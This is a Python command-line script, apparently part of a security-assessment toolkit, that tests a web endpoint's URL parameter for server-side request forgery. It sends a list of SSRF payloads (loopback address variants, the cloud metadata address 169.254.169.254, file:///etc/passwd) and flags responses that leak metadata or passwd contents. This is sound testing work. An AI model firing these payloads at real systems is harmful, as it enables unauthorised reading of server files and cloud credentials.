#!/usr/bin/env python3
"""Probe URL-fetching parameters for SSRF indicators on authorized targets."""

import argparse
import time
import urllib.error
import urllib.parse
import urllib.request

UA = "security-assessment-scripts/1.0"

SSRF_PAYLOADS = [
  ("localhost http", "http://127.0.0.1/"),
  ("localhost alt", "http://localhost/"),
  ("loopback variant", "http://0x7f000001/"),
  ("decimal loopback", "http://2130706433/"),
  ("cloud metadata (AWS/GCP)", "http://169.254.169.254/latest/meta-data/"),
  ("metadata alternate path", "http://169.254.169.254/computeMetadata/v1/"),
  ("file scheme", "file:///etc/passwd"),
]

SIGNATURES = {
  "ami-id": "cloud metadata leaked",
  "latest/meta-data": "metadata listing leaked",
  "root:x:0:0": "passwd file contents leaked",
  "daemon:x:1:1": "passwd file contents leaked",
}


def fetch(url, timeout):
  request = urllib.request.Request(url, headers={"User-Agent": UA})
  start = time.monotonic()
  try:
    response = urllib.request.urlopen(request, timeout=timeout)
    body = response.read(65536).decode("utf-8", "replace")
    return getattr(response, "status", response.code), body, time.monotonic() - start
  except urllib.error.HTTPError as exc:
    body = exc.read(65536).decode("utf-8", "replace")
    return exc.code, body, time.monotonic() - start
  except (urllib.error.URLError, OSError):
    return None, "", time.monotonic() - start


def main():
  parser = argparse.ArgumentParser(description="Test a URL-fetching parameter for server-side request forgery on an authorized target.")
  parser.add_argument("url", help="target endpoint, e.g. https://lab.example/fetch?url=IGNORED")
  parser.add_argument("--param", default="url", help="parameter name to inject payloads into")
  parser.add_argument("--timeout", type=float, default=10.0, help="per-request timeout in seconds")
  parser.add_argument("--delay", type=float, default=0.2, help="delay between requests in seconds")
  args = parser.parse_args()

  separator = "&" if "?" in args.url else "?"
  baseline_param = f"{separator}{args.param}={urllib.parse.quote('http://example.com/', safe='')}"

  baseline_status, baseline_body, baseline_time = fetch(args.url + baseline_param, args.timeout)
  print(f"[*] baseline: HTTP {baseline_status}, {len(baseline_body)} bytes, {baseline_time:.2f}s\n")

  confirmed = False
  for label, payload in SSRF_PAYLOADS:
    probe_url = f"{args.url}{separator}{args.param}={urllib.parse.quote(payload, safe='')}"
    status, body, elapsed = fetch(probe_url, args.timeout)
    findings = []
    for signature, meaning in SIGNATURES.items():
      if signature in body:
        findings.append(meaning)
    if status is None and elapsed >= args.timeout * 0.9:
      findings.append(f"timeout/hang after {elapsed:.2f}s (possible filtered connect)")
    if baseline_time > 0 and elapsed > baseline_time * 4:
      findings.append(f"notable delay vs baseline ({elapsed:.2f}s vs {baseline_time:.2f}s)")

    flag = "[!]" if any("leaked" in finding for finding in findings) else "[ ]"
    detail = "; ".join(findings) if findings else (f"HTTP {status}" if status is not None else "no response")
    print(f"{flag} {label}: {detail}")
    print(f"      payload={payload}")
    if findings and any("leaked" in finding for finding in findings):
      confirmed = True
    time.sleep(args.delay)

  print()
  if confirmed:
    print("Strong SSRF indicators found - verify manually and document impact.")
  else:
    print("No definitive SSRF signatures; review timing/reflection results manually.")


if __name__ == "__main__":
  main()
